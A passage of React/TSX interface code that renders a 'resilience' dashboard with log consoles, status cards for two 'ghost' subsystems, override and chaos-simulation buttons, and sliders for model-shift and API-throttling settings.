                        </div>
                      </div>

                      {/* Checklist Live Logger Feed */}
                      <div className="bg-[#020305] border border-[#1f293d]/50 p-2 rounded-lg h-24 overflow-y-auto font-mono text-[8px] text-slate-300 leading-relaxed flex flex-col gap-0.5 scrollbar-none">
                        <div className="text-slate-500 font-bold border-b border-slate-900 pb-0.5 mb-1 flex justify-between">
                          <span>MATRIX CODESHIELD SHIELDMONITOR LOGS</span>
                          <span className="text-emerald-400">ACTIVE</span>
                        </div>
                        {checklistLogs.slice(-20).map((log, i) => (
                          <div key={i} className="border-b border-slate-950/10 pb-0.5">{log}</div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* TAB 3: DUAL GHOST FUSION LAYER */}
                  {resilienceTab === 'ghosts' && (
                    <div className="flex flex-col gap-3">
                      {/* Dual Ghosts Overview Grid */}
                      <div className="grid grid-cols-2 gap-2">
                        {/* Ghost I: MatrixCore */}
                        <div className="p-2.5 bg-[#010307]/80 border border-blue-500/20 rounded-lg flex flex-col gap-1.5 relative overflow-hidden">
                          <div className="absolute top-0 right-0 w-16 h-16 bg-blue-500/5 rounded-full blur-xl pointer-events-none" />
                          <div className="flex items-center justify-between">
                            <span className="font-extrabold text-[10px] text-blue-400 uppercase tracking-wider flex items-center gap-1">
                              <Cpu className="w-3.5 h-3.5" />
                              Ghost-I: MatrixCore
                            </span>
                            <span className={`text-[8px] font-mono px-1 py-0.5 rounded ${
                              ghostData?.matrixCore?.status === 'CLAMPING_DOWN' ? 'bg-amber-500/10 text-amber-400 border border-amber-500/20 animate-pulse' : 'bg-blue-500/10 text-blue-400 border border-blue-500/20'
                            }`}>
                              {ghostData?.matrixCore?.status ?? "ENFORCING"}
                            </span>
                          </div>
                          
                          <div className="text-[9px] text-slate-400">
                            <p className="text-slate-500 text-[8px] italic mb-1">Deterministic law-engine of boundaries</p>
                            <div className="flex flex-col gap-1 font-mono text-[8px]">
                              <div className="flex justify-between border-b border-slate-900/40 pb-0.5">
                                <span>Integrity Profile:</span>
                                <span className="font-bold text-white">{ghostData?.matrixCore?.integrity ?? 100}%</span>
                              </div>
                              <div className="flex justify-between border-b border-slate-900/40 pb-0.5">
                                <span>Zero-Trust:</span>
                                <span className="text-blue-400">{ghostData?.matrixCore?.metrics?.zeroTrustBoundary ?? "STRICT"}</span>
                              </div>
                              <div className="flex justify-between border-b border-slate-900/40 pb-0.5">
                                <span>Sandboxed Workers:</span>
                                <span className="text-white">{ghostData?.matrixCore?.metrics?.sandboxedWorkers ?? 4} active</span>
                              </div>
                              <div className="flex justify-between">
                                <span>Enforcements:</span>
                                <span className="text-blue-400">{ghostData?.matrixCore?.metrics?.ruleEnforcementsCount ?? 1420}</span>
                              </div>
                            </div>
                          </div>

                          <button
                            disabled={isGhostActionRunning !== null}
                            onClick={() => triggerGhostOverride('matrix_clamp')}
                            className="mt-1 w-full py-1 border border-blue-500/30 text-blue-400 bg-blue-500/5 hover:bg-blue-500/10 text-[8.5px] font-mono rounded cursor-pointer transition-colors"
                          >
                            {isGhostActionRunning === 'matrix_clamp' ? 'CLAMPING...' : 'ENFORCE CLAMP'}
                          </button>
                        </div>

                        {/* Ghost II: MandelaCore */}
                        <div className="p-2.5 bg-[#010307]/80 border border-purple-500/20 rounded-lg flex flex-col gap-1.5 relative overflow-hidden">
                          <div className="absolute top-0 right-0 w-16 h-16 bg-purple-500/5 rounded-full blur-xl pointer-events-none" />
                          <div className="flex items-center justify-between">
                            <span className="font-extrabold text-[10px] text-purple-400 uppercase tracking-wider flex items-center gap-1">
                              <Sparkles className="w-3.5 h-3.5" />
                              Ghost-II: MandelaCore
                            </span>
                            <span className={`text-[8px] font-mono px-1 py-0.5 rounded ${
                              ghostData?.mandelaCore?.status === 'MUTUAL_SURVIVAL' ? 'bg-rose-500/10 text-rose-400 border border-rose-500/20 animate-pulse' : 'bg-purple-500/10 text-purple-400 border border-purple-500/20'
                            }`}>
                              {ghostData?.mandelaCore?.status ?? "HEALING"}
                            </span>
                          </div>

                          <div className="text-[9px] text-slate-400">
                            <p className="text-slate-500 text-[8px] italic mb-1">Adaptive survival-engine of healing</p>
                            <div className="flex flex-col gap-1 font-mono text-[8px]">
                              <div className="flex justify-between border-b border-slate-900/40 pb-0.5">
                                <span>Integrity Profile:</span>
                                <span className="font-bold text-white">{ghostData?.mandelaCore?.integrity ?? 100}%</span>
                              </div>
                              <div className="flex justify-between border-b border-slate-900/40 pb-0.5">
                                <span>Healing Loops:</span>
                                <span className="text-purple-400">{ghostData?.mandelaCore?.metrics?.activeSelfHealingLoops ?? 2} threads</span>
                              </div>
                              <div className="flex justify-between border-b border-slate-900/40 pb-0.5">
                                <span>Mesh Routes:</span>
                                <span className="text-white">{ghostData?.mandelaCore?.metrics?.meshRoutesCount ?? 16} paths</span>
                              </div>
                              <div className="flex justify-between">
                                <span>Avoided Failures:</span>
                                <span className="text-purple-400">{ghostData?.mandelaCore?.metrics?.predictiveFailuresAvoided ?? 89}</span>
                              </div>
                            </div>
                          </div>

                          <button
                            disabled={isGhostActionRunning !== null}
                            onClick={() => triggerGhostOverride('mandela_heal')}
                            className="mt-1 w-full py-1 border border-purple-500/30 text-purple-400 bg-purple-500/5 hover:bg-purple-500/10 text-[8.5px] font-mono rounded cursor-pointer transition-colors"
                          >
                            {isGhostActionRunning === 'mandela_heal' ? 'REPAIRING...' : 'DISPATCH HEAL'}
                          </button>
                        </div>
                      </div>

                      {/* Ghost Interlock / Fusion Layer Controls */}
                      <div className="p-2.5 bg-black border border-[#1f293d]/50 rounded-lg flex flex-col gap-2 font-mono text-[9px]">
                        <div className="flex justify-between items-center text-[9.5px] font-black border-b border-slate-900 pb-1 text-slate-400 uppercase">
                          <span className="flex items-center gap-1">
                            <Zap className="w-3.5 h-3.5 text-amber-400" />
                            Interlock Fusion Arbiter
                          </span>
                          <span className="text-[#06b6d4] text-[8.5px]">{ghostData?.fusionLayer?.status ?? "OPTIMIZED_BALANCE"}</span>
                        </div>

                        <div className="grid grid-cols-2 gap-1 text-[8px] text-slate-500">
                          <div>
                            <span className="text-slate-400 block font-bold">1. Determinism Failover Rule:</span>
                            <span>{ghostData?.fusionLayer?.rules?.determinismFailover}</span>
                          </div>
                          <div>
                            <span className="text-slate-400 block font-bold">2. Adaptation Clamping Rule:</span>
                            <span>{ghostData?.fusionLayer?.rules?.adaptationUnstable}</span>
                          </div>
                        </div>

                        <div className="flex items-center justify-between border-t border-slate-900/60 pt-1.5 text-[8.5px]">
                          <span className="text-slate-400 truncate">
                            E2E Handshake Token: <span className="text-indigo-400 font-mono">{ghostData?.fusionLayer?.handshakeToken?.substring(0, 16)}...</span>
                          </span>
                          <button
                            disabled={isGhostActionRunning !== null}
                            onClick={() => triggerGhostOverride('zero_handshake')}
                            className="px-2 py-0.5 border border-indigo-500/30 text-indigo-400 bg-indigo-500/5 hover:bg-indigo-500/10 rounded cursor-pointer transition-all text-[8px]"
                          >
                            {isGhostActionRunning === 'zero_handshake' ? 'SIGNING...' : 'RE-SIGN HANDSHAKE'}
                          </button>
                        </div>

                        <div className="grid grid-cols-2 gap-1.5 pt-1">
                          <button
                            disabled={isGhostChaosRunning}
                            onClick={triggerGhostChaos}
                            className="py-1.5 bg-gradient-to-r from-red-600 to-amber-600 hover:from-red-500 hover:to-amber-500 text-black font-black uppercase text-[8.5px] rounded tracking-wider cursor-pointer transition-all"
                          >
                            {isGhostChaosRunning ? 'SIMULATING STORM...' : 'RUN CHAOS SIMULATION'}
                          </button>
                          <button
                            disabled={isGhostActionRunning !== null}
                            onClick={() => triggerGhostOverride('reset')}
                            className="py-1.5 border border-slate-800 text-slate-400 hover:text-white hover:bg-slate-900/50 text-[8.5px] font-black uppercase rounded tracking-wider cursor-pointer transition-all"
                          >
                            RESET SYSTEM NOMINAL
                          </button>
                        </div>
                      </div>

                      {/* Live Ghost Codeshield Console */}
                      <div className="bg-[#020305] border border-[#1f293d]/50 p-2 rounded-lg h-24 overflow-y-auto font-mono text-[8px] text-slate-300 leading-relaxed flex flex-col gap-0.5 scrollbar-none">
                        <div className="text-slate-500 font-bold border-b border-slate-900 pb-0.5 mb-1 flex justify-between">
                          <span>DUAL-GHOST SHIELDMONITOR INTELLIGENCE CONSOLE</span>
                          <span className="text-violet-400 animate-pulse">SOLID CODESHIELD</span>
                        </div>
                        {(ghostData?.logs || []).slice(-15).map((log: string, i: number) => {
                          let colorClass = "text-slate-300";
                          if (log.includes("[MATRIX]")) colorClass = "text-blue-400";
                          if (log.includes("[MANDELA]")) colorClass = "text-purple-400";
                          if (log.includes("[CHAOS_BATTLE]")) colorClass = "text-rose-400 font-extrabold animate-pulse";
                          return (
                            <div key={i} className={`border-b border-slate-950/10 pb-0.5 ${colorClass}`}>{log}</div>
                          );
                        })}
                      </div>
                    </div>
                  )}

                  {/* TAB 4: PARAMETER TUNING */}
                  {resilienceTab === 'tuning' && (
                    <div className="flex flex-col gap-2.5 bg-black border border-[#1f293d] rounded-xl p-3">
                      <div className="flex justify-between items-center text-[10px]">
                        <span className="text-slate-400">Pre-emptive Model Shift:</span>
                        <input
                          type="checkbox"
                          checked={preemptiveEnabled}
                          onChange={e => setPreemptiveEnabled(e.target.checked)}
                          className="w-4 h-4 accent-[#06b6d4] cursor-pointer"
                        />
                      </div>
                      
                      <div>
                        <div className="flex justify-between text-[9.5px] text-slate-400 mb-0.5">
                          <span>Shift Threshold Credits:</span>
                          <span className="font-mono text-[#06b6d4]">{preemptiveThreshold} cr</span>
                        </div>
                        <input
                          type="range"
                          min="50"
                          max="400"
                          step="25"
                          value={preemptiveThreshold}
                          onChange={e => setPreemptiveThreshold(Number(e.target.value))}
                          className="w-full accent-[#06b6d4] cursor-pointer h-1 rounded"
                        />
                      </div>

                      <div className="flex justify-between items-center text-[10px] mt-1">
                        <span className="text-slate-400">Adaptive API Throttling:</span>
                        <input
                          type="checkbox"
                          checked={throttlingEnabled}
                          onChange={e => setThrottlingEnabled(e.target.checked)}
                          className="w-4 h-4 accent-amber-400 cursor-pointer"
                        />
                      </div>

                      <div>
                        <div className="flex justify-between text-[9.5px] text-slate-400 mb-0.5">
                          <span>Throttling Delay (Pacing):</span>
                          <span className="font-mono text-amber-400">{throttleDelayMs} ms</span>
                        </div>
                        <input
                          type="range"
                          min="100"
                          max="2000"
                          step="100"
                          value={throttleDelayMs}
                          onChange={e => setThrottleDelayMs(Number(e.target.value))}
                          className="w-full accent-amber-400 cursor-pointer h-1 rounded"
                        />
                      </div>

                      <button
                        onClick={handleUpdateTelemetryConfig}
                        className="w-full py-1.5 bg-[#06b6d4] text-black text-[9.5px] font-black rounded uppercase tracking-wider cursor-pointer hover:bg-[#05a0bc] transition-colors mt-1"
                      >
                        Commit Resilience Rules
                      </button>
                    </div>
                  )}
                </div>
              )}

            </div>

            {/* Segment Description Footnote */}
            <div className="border-t border-[#1f293d]/50 pt-2 flex items-center justify-between text-[9px] text-slate-500 font-mono">
              <span>PROBE STATUS // OK</span>
              <span>UTC: {new Date().toISOString().slice(11, 19)}</span>
            </div>

          </div>
        </div>

      </div>
    </div>
  );
};
